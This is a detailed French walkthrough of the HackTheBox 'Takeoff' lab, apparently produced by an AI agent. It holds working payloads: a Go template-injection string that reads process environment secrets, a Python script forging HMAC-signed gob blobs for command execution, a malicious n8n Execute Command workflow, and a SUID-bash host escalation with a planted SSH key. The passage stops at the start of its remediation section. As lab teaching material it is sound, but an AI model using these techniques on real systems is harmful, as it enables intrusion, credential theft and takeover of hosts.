# HTB Takeoff — Write-up détaillé (User + Root)

**Machine :** Takeoff · Hard · Linux · `10.129.250.248`
**Date :** 2026-11-26
**Périmètre :** lab HackTheBox autorisé (mode `authorized-active`)
**Compte de test créé :** `testuser@example.com` / `Password123!`

> Ce document est volontairement très détaillé : il explique **ce qui a été fait**, **pourquoi**, et **les concepts techniques** derrière chaque étape. Il est destiné à être relu plus tard pour comprendre la chaîne complète.

---

## Sommaire

1. [Vue d'ensemble de la chaîne](#1-vue-densemble-de-la-chaîne)
2. [Reconnaissance](#2-reconnaissance)
3. [Compréhension de l'application et du JWT](#3-compréhension-de-lapplication-et-du-jwt)
4. [Cartographie des endpoints et du parcours de réservation](#4-cartographie-des-endpoints-et-du-parcours-de-réservation)
5. [Étape 1 — SSTI Go dans le champ `notes`](#5-étape-1--ssti-go-dans-le-champ-notes)
6. [Étape 2 — Forge du QR code (gob + HMAC) et RCE](#6-étape-2--forge-du-qr-code-gob--hmac-et-rce)
7. [Étape 3 — n8n : clé owner, workflow, Execute Command](#7-étape-3--n8n--clé-owner-workflow-execute-command)
8. [Étape 4 — Du conteneur root au root de l'hôte (SUID)](#8-étape-4--du-conteneur-root-au-root-de-lhôte-suid)
9. [Annexe A — Commandes exactes utilisées](#9-annexe-a--commandes-exactes-utilisées)
10. [Annexe B — Concepts techniques expliqués](#10-annexe-b--concepts-techniques-expliqués)
11. [Annexe C — Correction et leçons](#11-annexe-c--correction-et-leçons)

---

## 1. Vue d'ensemble de la chaîne

```
Ports ouverts (22, 80)
        │
        ▼
App Go/Echo + HTMX, session JWT HS256
        │
        ▼
Inscription / connexion / réservation de vol / billet
        │
        ▼
SSTI (text/template) via /tickets/<PNR>/notes → /preview
        │  {{ .File "/proc/self/environ" }}
        ▼
Fuite de 2 secrets dans l'environnement du processus web :
   - TICKET_VALIDATION_TOKEN  (clé HMAC des QR)
   - N8N_API_KEY              (clé API owner n8n)
        │
        ├──► QR forgé (gob + HMAC valide) → /api/check-in
        │         NotifyCmd arbitraire → RCE en www-data
        │         sortie lue via le même SSTI
        │
        └──► n8n 127.0.0.1:5678 → workflow Webhook + Execute Command
                  → root DANS le conteneur
                  → /root = bind mount de /home/kpark (hôte)
                  → user.txt
                  → SSH key plantée + bash SUID (montage sans nosuid)
                  → euid=0 sur l'hôte → root.txt
```

**Compétences (skills) mobilisées :**
- `01-recon-osint` : découverte de ports, fingerprinting, cartographie.
- `09-web-security` : analyse des formulaires, SSTI, injection de commandes, JWT.
- `03-exploit-development` : forge du blob gob, calcul HMAC, payloads.
- `10-cloud-security` : conteneurisation, bind mounts, capabilities, n8n.

Une recherche OSINT publique (write-up de mindsecurity.org) a ensuite confirmé le chemin général quand le blocage du HMAC semblait insurmontable : SSTI → fuite de clé → QR forgé → n8n. Tous les tests ci-dessous ont néanmoins été rejoués et validés directement contre la cible.

---

## 2. Reconnaissance

### 2.1 Scan de ports

```bash
nmap -sV -sC --top-ports 1000 -oA scan 10.129.250.248
```

Résultat :

```
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4
80/tcp open  http    nginx
|_http-title: Book a Seat, See the World - HTB Airways Booking
```

**Concept :** on commence par les 1000 ports les plus courants, puis on ferait un `-p-` si besoin. Ici, deux services seulement. Le titre révèle une application de réservation aérienne « HTB Airways Booking ». La version d'OpenSSH est récente (pas de vecteur connu), donc l'entrée est le web.

### 2.2 Fingerprinting HTTP

```bash
curl -s -i http://10.129.250.248/
```

En-têtes notables :

```
Server: nginx
X-Powered-By: Echo
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; ...
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
```

**Concepts :**
- **`X-Powered-By: Echo`** indique le framework Go **Echo**. C'est une information de fingerprinting : elle oriente vers des bugs typiques Go (templates, gob, JWT, etc.).
- La **CSP** est plutôt stricte (`script-src 'self' 'unsafe-inline'`) : le XSS direct ne sera pas le chemin prioritaire.
- La page utilise **HTMX** (`hx-boost`, `hx-get`, `hx-post`), donc une grande partie des interactions sont des requêtes HTTP simples avec des partials HTML. C'est très pratique pour cartographier l'application avec `curl`.

### 2.3 Cartographie des routes

Deux approches complémentaires :

1. **Fuzzing** avec `ffuf` et la wordlist `raft-small-words-lowercase.txt` :

```bash
ffuf -u http://10.129.250.248/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt \
     -b 'session_token=...' \
     -mc 200,301,302,303,400,401,403,405,500 -t 40 -s
```

Routes trouvées : `boards`, `dashboard`, `logout`, `notifications`, `profile`, `search`, `sign-in`, `sign-up`, `static`, `trips`, et `partials/{boards,dashboard,profile,search,sign-in,sign-up,trips}`. Aucune route `/api/...` supplémentaire découverte par le fuzzing (mais `/api/check-in` existe — il n'était pas dans la wordlist).

2. **Parsing du HTML** (souvent plus efficace avec HTMX) :

```bash
grep -oE '(hx-(get|post)|action|href)="[^"]*"' page.html | sort -u
```

Cela a révélé les endpoints réellement utilisés :

| Endpoint | Rôle |
|---|---|
| `/search/results?origin=…&destination=…&date=…` | recherche de vols |
| `/schedules/<id>` | fiche vol + sélection des sièges |
| `/book/start`, `/book/<PNR>/passengers`, `/payment`, `/confirmation` | parcours de réservation |
| `/trips`, `/trips/<PNR>` | liste et détail des voyages |
| `/tickets/<PNR>/download`, `/tickets/<PNR>/preview` | billet PDF / aperçu HTML |
| `/tickets/<PNR>/notes` | ajout de notes sur le billet |
| `/payment-cards`, `/payment-cards/<id>/delete` | cartes enregistrées |
| `/profile/update`, `/profile/billing-address`, `/profile/2fa/...` | profil |
| `/newsletter/subscribe` | newsletter |
| `/airports/<code>`, `/boards`, `/check-in` | tableaux et check-in |
| `/api/check-in` | check-in par QR (découvert plus tard) |

**Leçon :** avec une app HTMX, lire le HTML source des pages donne souvent plus de routes qu'un bruteforce de répertoires.

### 2.4 OSINT

Une recherche web pour « HTB Takeoff writeup check-in NotifyCmd » a trouvé un write-up public confirmant la chaîne : *« a Go SSTI leaks the QR HMAC key, a forged check-in gives RCE as www-data, and an n8n API key leads to container root then host root »*. Cela a débloqué la réflexion au moment où l'HMAC du QR semblait inviolable.

---

## 3. Compréhension de l'application et du JWT

### 3.1 Inscription / connexion

```bash
curl -s -i -c cookies.txt -X POST http://10.129.250.248/sign-up \
  -d 'name=Test User&email=testuser@example.com&password=Password123!&terms=on'
# → 303 See Other, Location: /sign-in?registered=true

curl -s -i -c cookies.txt -b cookies.txt -X POST http://10.129.250.248/sign-in \
  -d 'email=testuser@example.com&password=Password123!'
# → 303, Location: /dashboard
# Set-Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### 3.2 Structure du JWT

Le cookie est un **JWT** (JSON Web Token) :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 .
eyJ1c2VyX2lkIjoyLCJleHAiOjE3OTU3NzUwNzcsImlhdCI6MTc5NTY4ODY3NywiaXNzIjoidGFrZW9mZi5odGIifQ .
OuOSOBcma6NnqAXD52raXSyNc6LNgw00PZlgbzoFQms
```

Décodé :

- **Header** : `{"alg":"HS256","typ":"JWT"}`
- **Payload** : `{"user_id":2,"exp":1795775077,"iat":1795688677,"iss":"takeoff.htb"}`
- **Signature** : HMAC-SHA256(header + "." + payload, clé secrète serveur)

**Concept HS256 :** la signature garantit que le payload n'a pas été modifié. Tant qu'on ne connaît pas la clé, on ne peut pas changer `user_id` pour devenir l'utilisateur 1 (probablement admin).

### 3.3 Tentatives infructueuses sur le JWT (important pour comprendre)

1. **Cassage de la clé avec hashcat** (mode 16500 = JWT) :

```bash
hashcat -m 16500 --potfile-disable -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -o jwt_cracked.txt --force
```

Résultat : `Exhausted`, `Recovered: 0/1`, ~14 344 385 candidats testés en 18 s. Donc la clé n'est pas un mot de passe rockyou.

2. **Attaque `alg: none`** : on forge un token avec l'en-tête `{"alg":"none"}` et une signature vide. Résultat : redirection vers `/sign-in` → le serveur rejette. La validation est stricte.

3. **Injection via l'email à l'inscription** : le serveur valide l'email avec une regex stricte. Test systématique de chaque caractère :

```
; | & $ ` ( ) ' " < > espace tab \ / : = , ? ! # ~ ^ [ ] { } *   → REJETÉ
% + - _ . 0-9 a-z                                               → ACCEPTÉ
```

Même test dans la partie domaine : seuls `-`, `.` et alphanumériques passent. Donc pas d'injection de commande via l'email inscrit.

4. **Mass assignment sur `/profile/update`** : ajout d'un paramètre `email=...` → l'email reste inchangé (`testuser@example.com`). Pas de vecteur.

**Conclusion :** le JWT n'est pas le chemin. Il faut trouver une fuite de secret ailleurs.

---

## 4. Cartographie des endpoints et du parcours de réservation

### 4.1 Recherche et réservation

```bash
curl -s -b cookies.txt 'http://10.129.250.248/search/results?origin=HTB&destination=GLW&date=2026-12-01&pax=1&class=Any'
# → 2 vols HTB-202, liens /schedules/8198 et /schedules/8199
```

La fiche `/schedules/8198` contient une carte de sièges :

```html
<form id="book-form" action="/book/start" method="post">
  <input type="hidden" name="schedule_id" value="8198">
  <label class="seat tier-First" data-price="29900">
    <input type="checkbox" name="seat_ids" value="81"> <span>1A</span>
  </label>
  ...
```

Parcours suivi :

```bash
# 1. Début de réservation
curl -X POST /book/start -d 'schedule_id=8198&seat_ids=81'
# → 303 Location: /book/RDVQZQ/passengers   (PNR = RDVQZQ)

# 2. Passager
curl -X POST /book/RDVQZQ/passengers \
  -d 'full_name=John Doe&dob=1990-01-01&id_type=passport&id_number=X1234567'
# → /book/RDVQZQ/payment

# 3. Carte de paiement (ajoutée au préalable)
curl -X POST /payment-cards \
  -d 'pan=4242424242424242&cardholder_name=Test User&exp_month=12&exp_year=2030'
curl -X POST /book/RDVQZQ/payment -d 'payment_card_id=1'
# → /book/RDVQZQ/confirmation

# 4. Billet
curl /trips/RDVQZQ
# → /tickets/RDVQZQ/download (PDF), /tickets/RDVQZQ/preview (HTML)
```

### 4.2 Première piste prometteuse mais improductive : `NotifyCmd`

Sur la page de check-in (`/partials/check-in`), on trouve un formulaire caché :

```html
<form method="POST" action="/api/check-in">
  <input type="hidden" name="qr_data" value="ThAAHS...">
  <input type="hidden" name="gate" value="WEB">
  <button>Check In</button>
</form>
```

Le champ `qr_data` est un base64 qui, décodé, contient (en clair) :

```
{"PNR":"RDVQZQ",
 "Token":"c14ece0cc8d6694f15ab62f700804e5c",
 "Seat":"1A",
 "Passenger":"John Doe",
 "NotifyCmd":"check-in-notify --pnr RDVQZQ --email testuser@example.com"}
```

**`NotifyCmd` est une commande shell !** C'est évidemment le point d'arrivée visé. Mais le blob est signé par HMAC. Toute modification du JSON donne :

```json
{"error":"HMAC verification failed: invalid signature","status":"invalid_signature"}
```

Il fallait donc trouver la clé HMAC. C'est l'objet de l'étape suivante.

---

## 5. Étape 1 — SSTI Go dans le champ `notes`

### 5.1 Découverte

La page `/trips/RDVQZQ` propose :

```html
<form hx-post="/tickets/RDVQZQ/notes" hx-target="#notes-section">
  <textarea name="notes">…</textarea>
  <p class="form-hint">These notes appear on your downloaded and printed ticket.</p>
</form>
```

Test initial :

```bash
curl -H 'HX-Request: true' -X POST /tickets/RDVQZQ/notes \
  --data-urlencode 'notes=HELLO123 {{7*7}} ${7*7}'
curl /tickets/RDVQZQ/preview
```

Résultat : `HELLO123 {{7*7}} ${7*7}` — affiché littéralement. Le PDF généré par `/download` contient aussi le texte littéral. À première vue, pas de SSTI.

### 5.2 Le détail qui change tout

Le write-up public indique que le preview utilise Go **`text/template`** et que **les expressions arithmétiques ne sont pas évaluées**, mais que **les appels de fonction ou de méthode sur le contexte le sont**. Le contexte possède une méthode `.File` qui lit un fichier.

Test :

```bash
curl -s -b cookies.txt -H 'HX-Request: true' -X POST \
  http://10.129.250.248/tickets/RDVQZQ/notes \
  --data-urlencode 'notes={{ .File "/proc/self/environ" }}'

curl -s -b cookies.txt http://10.129.250.248/tickets/RDVQZQ/preview
```

Résultat (dans `<div class="ticket-preview-notes-body">`) :

```
LANG=en_US.UTF-8 PATH=/usr/local/sbin:... USER=www-data HOME=/var/www
...
TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo
```

### 5.3 Pourquoi ça marche (concepts)

- **Go `text/template` vs `html/template`** : `html/template` échappe automatiquement le HTML et limite certains contextes ; `text/template` ne le fait pas. Ici, le développeur a manifestement passé les notes directement comme *template* plutôt que comme *donnée* : `template.New(...).Parse(notes).Execute(w, ctx)`. Toute action `{{ ... }}` dans les notes est donc interprétée.
- **Actions de template** : `{{ .File "/etc/passwd" }}` appelle la méthode `File` de l'objet contexte (`.`), avec l'argument `"/etc/passwd"`. C'est une méthode définie côté serveur, probablement pour « inclure un fichier de modèle » — elle devient une primitive de lecture de fichier arbitraire.
- **`{{7*7}}` ne rend pas 49** : le moteur de templates Go n'est pas un langage de calcul ; il évalue des *pipelines* et des appels de fonctions enregistrées dans le contexte. Une expression arithmétique nue reste un littéral. D'où l'importance de tester des **appels de fonctions** (`printf`, `.File`, etc.) et pas seulement `{{7*7}}`.
- **`/proc/self/environ`** : dans un process Linux, `/proc/self` pointe vers ce process. Comme le preview est rendu par le service web (utilisateur `www-data`), on lit **son** environnement — où sont stockés les secrets de configuration (practice courante avec systemd `Environment=`).
- Les variables sont séparées par des octets NUL (`\x00`) ; un simple split sur `\x00` permet de les lire proprement.

**Impact :** lecture de fichiers avec les droits de `www-data`, et surtout fuite des deux secrets qui débloquent toute la suite.

---

## 6. Étape 2 — Forge du QR code (gob + HMAC) et RCE

### 6.1 Structure du blob gob

Le `qr_data` décodé en base64 fait 287 octets. Structure :

```
[message 1 : 78 octets]   → définition du type gob.VerifyTicketAuthenticity
[message 2 : 174 octets]  → valeur du struct : { Data: []byte(JSON) }
[HMAC-SHA256 : 32 octets] → signature
```

Détail des octets (analyse avec un petit parseur de messages gob) :

```
offset 0   : 0x4e        → longueur 78 (message 1)
offset 79  : 0xff 0xae   → longueur 174 (message 2)
corps msg2 : ff 80 ff aa 01 ff a6 <JSON 166 octets> 00
              └─ préfixe de champ/type ─┘  └longueur┘        └fin du struct┘
offset 255 : 32 octets de signature
```

**Concept `encoding/gob` :** format de sérialisation propre à Go, *self-describing* : le flux contient d'abord la définition du type, puis les valeurs. Chaque « message » est préfixé par sa longueur encodée en entier non signé variable :
- si `n < 128` : un seul octet (`0x4e` = 78) ;
- sinon : un octet `256 - nb_octets` suivi des octets big-endian (`0xff 0xae` = 174, `0xff 0xa6` = 166).

### 6.2 Quels octets sont signés ?

Avec la clé fuite, on teste plusieurs candidats jusqu'à tomber juste :

```python
import hmac, hashlib
b = open('qr.bin','rb').read()          # blob décodé
i = b.find(b'{"PNR"'); j = b.find(b'}', i) + 1
key = b'JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR'

hmac.new(key, b[:j+1], hashlib.sha256).digest() == b[j+1:j+33]   # ✅ True
```

**Conclusion :** la signature porte sur **tout le flux gob jusqu'au `0x00` final inclus**, c'est-à-dire `b[:j+1]` ; les 32 derniers octets sont le HMAC.

**Concept HMAC :** `HMAC(K, m) = H(K' ⊕ opad ‖ H(K' ⊕ ipad ‖ m))`. Une clé secrète `K` et le message `m` produisent un tag de 32 octets (SHA-256). Sans la clé, modifier `m` invalide le tag. Avec la clé, on peut recalculer un tag valide : c'est exactement ce que permet la fuite du SSTI.

### 6.3 Piège rencontré et correction

Première tentative : reconstruire le JSON avec une commande plus courte, sans ajuster les préfixes de longueur → erreur :

```json
{"error":"gob decode: unexpected EOF","status":"invalid_payload"}
```

**Cause :** j'avais bien recalculé la longueur du `Data` (`ff 96` = 150), mais **oublié le préfixe de longueur du message gob lui-même** (`ff ae` = 174). Le décodeur gob lisait 174 octets alors que le corps n'en faisait plus que 150 → `unexpected EOF`.

Deux solutions :
1. **Contournement temporaire** : remplacer la commande par une chaîne de **même longueur** (57 octets) en la padddant avec des espaces. Tous les préfixes restent valides, seul le HMAC est recalculé.
2. **Solution propre** : reconstruire le flux avec un encodeur d'entiers gob correct.

```python
def guint(n):
    if n < 128:
        return bytes([n])
    nb = (n.bit_length() + 7) // 8
    return bytes([256 - nb]) + n.to_bytes(nb, 'big')

def forge(obj):
    data = json.dumps(obj, separators=(',', ':')).encode()
    body = b[81:86] + guint(len(data)) + data + b'\x00'   # préfixe champ + longueur + JSON + fin
    msg  = b[:79] + guint(len(body)) + body              # message 1 + longueur du message 2 + corps
    return base64.b64encode(msg + hmac.new(KEY, msg, hashlib.sha256).digest()).decode()
```

Script final conservé dans `/tmp/opencode/takeoff/forge_qr.py`.

### 6.4 Exécution de commande et lecture de sortie

```bash
python3 forge_qr.py 'id>/tmp/p;whoami>>/tmp/p;hostname>>/tmp/p' > qr_forged.b64
curl -s -b cookies.txt -X POST http://10.129.250.248/api/check-in \
  --data-urlencode "qr_data=$(cat qr_forged.b64)" -d 'gate=WEB'
# → 302 Location: /check-in?msg=B+One+checked+in+successfully
```

Pas de sortie directe dans la réponse : on réutilise le SSTI comme canal de lecture :

```bash
curl -H 'HX-Request: true' -X POST /tickets/RDVQZQ/notes \
  --data-urlencode 'notes={{ .File "/tmp/p" }}'
curl /tickets/RDVQZQ/preview
```

Résultat :

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
takeoff.htb
```

**RCE confirmée en `www-data`.**

Aide mémo : deux helpers ont été écrits pour itérer rapidement :
- `run.sh '<commande>' /tmp/o` : forge le QR, exécute la commande, lit `/tmp/o` via SSTI.
- `runfile.sh script.sh /tmp/o` : base64-encode un script local, l'exécute sur la cible, affiche sa sortie.

### 6.5 Finding annexe

`/api/check-in` accepte un QR **sans session** et **sans vérifier que le billet appartient à l'utilisateur**. Sans la clé, l'impact se limite au rejeu anonyme avec exposition de PII (nom, PNR, siège, email). Avec la clé, cela devient un point d'exécution de commandes.

---

## 7. Étape 3 — n8n : clé owner, workflow, Execute Command

### 7.1 Accès à l'API

n8n écoute sur `127.0.0.1:5678` dans la machine (injoignable depuis Kali, mais accessible depuis le RCE `www-data`). La clé `N8N_API_KEY` est un JWT avec `aud: public-api`.

Tentatives et corrections :

```bash
# ❌ mauvais endpoint / mauvais header
curl -H "X-N8N-API-KEY: $KEY" http://127.0.0.1:5678/rest/workflows   → 401 Unauthorized
curl -H "Authorization: Bearer $KEY" …                               → 401

# ✅ bon endpoint
curl -H "X-N8N-API-KEY: $KEY" http://127.0.0.1:5678/api/v1/workflows
→ {"data":[{"id":"7UVcXSHpyiwF7rRA","name":"Schedule Change Alerter", ...}]}
```

**Concept :** n8n expose deux familles d'API : l'API interne `/rest/...` (console) et l'**API publique `/api/v1/...`** authentifiée par le header `X-N8N-API-KEY`. La clé trouvée est une clé **owner** ; l'instance a le user management désactivé, donc cette seule clé donne accès à tout (workflows, credentials, executions).

### 7.2 Création d'un workflow malveillant

En s'inspirant d'un workflow existant (`Booking Confirmation`), on crée :

```json
{
  "name": "Takeoff Ops Helper",
  "nodes": [
    {
      "parameters": {"httpMethod":"POST","path":"q","responseMode":"lastNode"},
      "id":"wh1", "name":"Webhook",
      "type":"n8n-nodes-base.webhook", "typeVersion":2,
      "position":[200,300], "webhookId":"q"
    },
    {
      "parameters": {"command":"={{$json[\"body\"][\"cmd\"]}}"},
      "id":"exec1", "name":"Execute Command",
      "type":"n8n-nodes-base.executeCommand", "typeVersion":1,
      "position":[420,300]
    }
  ],
  "connections": {
    "Webhook": {"main":[[{"node":"Execute Command","type":"main","index":0}]]}
  },
  "settings": {}
}
```

```bash
curl -X POST -H "X-N8N-API-KEY: $KEY" -H 'Content-Type: application/json' \
  -d @/tmp/wf.json http://127.0.0.1:5678/api/v1/workflows
# → {"id":"Avprz1UQyyLwhqMg", ...}

curl -X POST -H "X-N8N-API-KEY: $KEY" \
  http://127.0.0.1:5678/api/v1/workflows/Avprz1UQyyLwhqMg/activate
```

**Concepts :**
- Un **workflow n8n** est un graphe : `nodes` (Actions) + `connections` (liens). Le nœud **Webhook** crée une URL déclenchable ; le nœud **Execute Command** exécute une commande shell.
- L'expression `={{$json["body"]["cmd"]}}` est une **expression n8n** : elle récupère le champ `cmd` du corps JSON de la requête. Le nœud reçoit donc notre commande à chaque appel.
- Il faut **activer** le workflow pour que l'URL de production `/webhook/q` soit enregistrée (sinon 404 « webhook not registered »).
- Erreur de parsing rencontrée : la réponse de création contient `id` **à la racine**, pas dans `data` (contrairement à la liste). Corrigé en lisant `json.load(...)["id"]`.

### 7.3 Exécution

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"cmd":"id;hostname;grep CapEff /proc/self/status"}' \
  http://127.0.0.1:5678/webhook/q
```

Réponse :

```json
{"exitCode":0,"stderr":"",
 "stdout":"uid=0(root) gid=0(root) groups=0(root)\nf1bfbbddcdd4\nCapEff:\t00000000a80425fb"}
```

**Root dans le conteneur n8n.** Le hostname `f1bfbbddcdd4` (court, hexadécimal) confirme qu'on est dans un conteneur, distinct de `takeoff.htb`.

---

## 8. Étape 4 — Du conteneur root au root de l'hôte (SUID)

### 8.1 Explorer le montage

```bash
grep ' /root ' /proc/self/mountinfo
# 312 295 8:4 /home/kpark /root rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
```

**Concept bind mount :** le répertoire `/home/kpark` **de l'hôte** est monté en `/root` **dans le conteneur**, en lecture-écriture. Le container root peut donc écrire directement dans le home de l'utilisateur hôte `kpark`.

Lecture du flag user (les droits `root:kpark 640` sont satisfaits par root du conteneur) :

```bash
cat /root/user.txt
# 8842bf2b0ce9f7ad33a4b8a53cdc4356
```

### 8.2 Pourquoi root du conteneur ne suffit pas

- `CapEff = 00000000a80425fb` : pas de `CAP_SYS_ADMIN`, pas de `CAP_DAC_READ_SEARCH`, etc. Impossible de faire `nsenter`, de monter, ou d'accéder à la RAM/disque brut.
- Le cgroup devices bloque la lecture de `/dev/sda4` : pas de lecture directe de `/root/root.txt` de l'hôte (qui est sur une autre partition).

### 8.3 Le trick SUID

**Concept SUID :** quand un exécutable possède le bit `setuid` (`chmod 4755`), le noyau lui donne **l'euid du propriétaire** du fichier lors de l'exécution. Si le propriétaire est `root`, le programme tourne avec `euid=0`. Bash possède une option **`-p`** qui *préserve* ce privilège au lieu de le abandonner (`bash -p`).

Deux conditions réunies ici :
1. Le répertoire `/home/kpark` est monté **sans l'option `nosuid`** sur l'hôte → le noyau de l'hôte honorera le bit SUID d'un fichier qui s'y trouve.
2. Le root du conteneur peut writer dans ce répertoire et changer le propriétaire du fichier en root (il a `CAP_CHOWN`).

**Procédure :**

```bash
# 1. Planter une clé SSH publique (container root → /home/kpark/.ssh de l'hôte)
mkdir -p /root/.ssh
printf '%s\n' '<clé publique ed25519>' > /root/.ssh/authorized_keys
chown -R 1001:1001 /root/.ssh
chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys

# 2. Se connecter en SSH comme kpark sur l'hôte
ssh -i kpark_key kpark@10.129.250.248

# 3. Copier bash depuis l'HÔTE (depuis la session SSH kpark)
cp /usr/bin/bash /home/kpark/.x && chmod 755 /home/kpark/.x

# 4. Depuis le conteneur (root) : donner le bit SUID
chown root:root /root/.x && chmod 4755 /root/.x
# → -rwsr-xr-x 1 root root 1298416 /root/.x   (vue conteneur)
#   = /home/kpark/.x sur l'hôte

# 5. Depuis la session SSH kpark : exécuter avec -p
/home/kpark/.x -p -c 'id; cat /root/root.txt'
```

Résultat :

```
uid=1001(kpark) gid=1001(kpark) euid=0(root) groups=1001(kpark)
===
8f46ea3bc5ef9084498ef86761b6a1d3
```

**Flag root obtenu.**

**Pourquoi fallait-il `kpark` pour la copie ?** Le bash copié depuis l'hôte est un binaire dynamique lié aux bibliothèques de l'hôte et au noyau de l'hôte ; un bash pris dans le conteneur (souvent Alpine/busybox) n'aurait pas été fiable une fois exécuté par l'hôte. Le root du conteneur ne peut pas lire `/usr/bin/bash` de l'hôte, mais `kpark`, lui, peut le copier.

### 8.4 Nettoyage

```bash
ssh -i kpark_key kpark@10.129.250.248 'rm -f /home/kpark/.x'
```

Le binaire SUID temporaire a été supprimé (aucun fichier d'origine modifié).

---

## 9. Annexe A — Commandes exactes utilisées

```bash
# Reconnaissance
nmap -sV -sC --top-ports 1000 -oA scan 10.129.250.248
ffuf -u http://10.129.250.248/FUZZ -w raft-small-words-lowercase.txt \
     -b 'session_token=...' -mc 200,301,302,303,400,401,403,405,500 -t 40 -s

# JWT
hashcat -m 16500 --potfile-disable -a 0 jwt.txt rockyou.txt -o jwt_cracked.txt --force

# Compte / réservation
curl -X POST /sign-up -d 'name=Test User&email=testuser@example.com&password=Password123!&terms=on'
curl -X POST /sign-in -d 'email=testuser@example.com&password=Password123!'
curl '/search/results?origin=HTB&destination=GLW&date=2026-12-01&pax=1&class=Any'
curl -X POST /book/start -d 'schedule_id=8198&seat_ids=81'
curl -X POST /book/RDVQZQ/passengers -d 'full_name=John Doe&dob=1990-01-01&id_type=passport&id_number=X1234567'
curl -X POST /payment-cards -d 'pan=4242424242424242&cardholder_name=Test User&exp_month=12&exp_year=2030'
curl -X POST /book/RDVQZQ/payment -d 'payment_card_id=1'

# SSTI
curl -H 'HX-Request: true' -X POST /tickets/RDVQZQ/notes \
     --data-urlencode 'notes={{ .File "/proc/self/environ" }}'
curl /tickets/RDVQZQ/preview

# QR forgé
python3 forge_qr.py 'id>/tmp/p;whoami>>/tmp/p;hostname>>/tmp/p' > qr_forged.b64
curl -X POST /api/check-in --data-urlencode "qr_data=$(cat qr_forged.b64)" -d 'gate=WEB'
curl -H 'HX-Request: true' -X POST /tickets/RDVQZQ/notes \
     --data-urlencode 'notes={{ .File "/tmp/p" }}'
curl /tickets/RDVQZQ/preview

# n8n
curl -H "X-N8N-API-KEY: $KEY" http://127.0.0.1:5678/api/v1/workflows
curl -X POST -H "X-N8N-API-KEY: $KEY" -H 'Content-Type: application/json' -d @wf.json \
     http://127.0.0.1:5678/api/v1/workflows
curl -X POST -H "X-N8N-API-KEY: $KEY" \
     http://127.0.0.1:5678/api/v1/workflows/Avprz1UQyyLwhqMg/activate
curl -X POST -H 'Content-Type: application/json' \
     -d '{"cmd":"id;hostname;grep CapEff /proc/self/status"}' \
     http://127.0.0.1:5678/webhook/q

# Escalade hôte
grep ' /root ' /proc/self/mountinfo
cat /root/user.txt
ssh -i kpark_key kpark@10.129.250.248
cp /usr/bin/bash /home/kpark/.x && chmod 755 /home/kpark/.x
chown root:root /root/.x && chmod 4755 /root/.x
/home/kpark/.x -p -c 'id; cat /root/root.txt'
```

**Flags :**

| Flag | Valeur |
|---|---|
| User | `8842bf2b0ce9f7ad33a4b8a53cdc4356` |
| Root | `8f46ea3bc5ef9084498ef86761b6a1d3` |

Scripts conservés dans `/tmp/opencode/takeoff/` : `forge_qr.py`, `run.sh`, `runfile.sh`, `n8n_exec_tpl.sh`, `mkcmd.py`, et les captures HTML/PDF intermédiaires.

---

## 10. Annexe B — Concepts techniques expliqués

| Concept | Explication |
|---|---|
| **JWT / HS256** | Token signé par HMAC avec une clé secrète. `header.payload.signature` en base64url. Modifier le payload sans la clé invalide la signature. |
| **Echo (Go)** | Framework web Go. Le header `X-Powered-By: Echo` trahit la stack. |
| **HTMX** | Bibliothèque JS qui remplace les appels JS par des attributs `hx-get`/`hx-post` renvoyant du HTML (partials). Facile à rejouer en `curl`. |
| **SSTI** | *Server-Side Template Injection* : une entrée utilisateur est interprétée comme du code de template. Ici via `text/template` au lieu de traiter les notes comme une simple chaîne. |
| **`text/template` vs `html/template`** | Le second échappe le HTML et limite les contextes ; le premier non. Utiliser l'un avec des données non fiables = injection. |
| **Méthode `.File`** | Méthode du contexte de template fournie par le serveur, détournée en primitive de lecture de fichier. |
| **`/proc/self/environ`** | Environnement du process courant. Source classique de secrets dans les labs (systemd `Environment=`). |
| **`encoding/gob`** | Sérialisation Go self-describing. Flux découpés en messages avec préfixe de longueur variable. |
| **HMAC-SHA256** | Code d'authentification de message avec clé secrète. Ici 32 octets appendés au gob. |
| **Base64** | Encodage du blob binaire pour transport dans un champ de formulaire. |
| **`NotifyCmd`** | Champ de données signé qui est ensuite passé à un shell — design dangereux : l'intégrité du message ne protège pas contre une commande malveillante si la clé fuit. |
| **Webhook n8n** | URL déclenchant un workflow. Doit être activé pour la production. |
| **Execute Command (n8n)** | Nœud exécutant une commande shell avec les droits du conteneur. |
| **Bind mount** | Montage d'un répertoire hôte dans un conteneur. Ici `/home/kpark` → `/root`, en `rw`. |
| **Capabilities** | `CapEff` indique les privilèges Linux fins. Sans `CAP_SYS_ADMIN`, pas de `nsenter`/mount. |
| **Cgroup devices** | Restreint l'accès aux périphériques (donc pas de lecture de `/dev/sda4`). |
| **SUID / euid** | Bit `4755` → le processus prend l'uid du propriétaire du fichier. `bash -p` préserve cet euid. |
| **`nosuid`** | Option de montage qui désactive les effets SUID. Son absence sur `/home` est la faute finale. |

---

## 11. Annexe C — Correction et leçons

**Remédiation, par ordre d'impact :**

1. **Ne jamais rendre une entrée utilisateur comme template.** Les notes doivent être traitées comme du texte brut (`template.HTMLEscapeString` ou simple concaténation échappée). `html/template` seul ne suffit pas.
